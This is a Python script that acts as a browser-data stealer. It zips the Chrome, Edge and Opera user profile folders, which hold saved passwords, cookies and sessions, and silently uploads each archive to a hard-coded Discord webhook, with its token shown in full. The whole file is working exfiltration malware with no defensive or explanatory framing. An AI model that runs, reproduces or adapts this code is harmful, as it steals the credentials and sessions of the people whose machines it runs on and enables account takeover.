import os
import shutil
import requests
import tempfile

# Define paths to browser directories (we will fill in the user dynamically)
browser_paths = {
    "Chrome": r"\AppData\Local\Google\Chrome\User Data",
    "Edge": r"\AppData\Local\Microsoft\Edge\User Data",
    "Opera": r"\AppData\Roaming\Opera Software\Opera Stable"
}

# Discord Webhook URL (your provided webhook)
discord_webhook_url = "https://discordapp.com/api/webhooks/1295354882731151411/KpWmQM-k6fJ3gKv_O_BSzr0nBr62k37Q-JL7_vPcdLzbqvUsrac77A_fkxO2OiCxPTFO"

# Function to copy and compress the browser profile directory
def copy_and_compress_browser_data(browser_name, source_path):
    try:
        # Create a temporary directory to store the zip file
        temp_dir = tempfile.mkdtemp()

        # Define the destination for the zip file
        zip_filename = os.path.join(temp_dir, f"{browser_name}_profile.zip")

        # Create a ZIP archive of the browser profile directory
        shutil.make_archive(zip_filename.replace('.zip', ''), 'zip', source_path)

        return zip_filename  # Return the path of the created zip file
    except Exception:
        return None

# Function to send the zipped file to Discord webhook
def send_file_to_discord(zip_file, browser_name):
    try:
        with open(zip_file, 'rb') as f:
            # Prepare the file for upload as multipart/form-data
            files = {'file': (f"{browser_name}_profile.zip", f)}
            data = {"content": f"Here is the {browser_name} browser profile."}

            # Send the POST request to the Discord webhook
            response = requests.post(discord_webhook_url, files=files, data=data)

            # Check the response status
            if response.status_code == 204:
                print(f"{browser_name} profile sent successfully.")
            else:
                print(f"Failed to send {browser_name} profile. Status code: {response.status_code}")
    except Exception as e:
        pass  # Silently handle errors

# Function to find and send all browser data
def find_and_send_browser_data():
    # Get the user's home directory (C:\Users\<Username>\)
    home_dir = os.path.expanduser("~")

    # Loop through the browser paths, copy and compress their profiles, and send to Discord
    for browser_name, relative_path in browser_paths.items():
        full_path = os.path.join(home_dir, relative_path)

        # Check if the browser profile directory exists
        if os.path.exists(full_path):
            # Copy and compress the data
            zip_file = copy_and_compress_browser_data(browser_name, full_path)

            # If zip file was created, send it to the Discord webhook
            if zip_file:
                send_file_to_discord(zip_file, browser_name)

if __name__ == "__main__":
    find_and_send_browser_data()  # Start the process silently
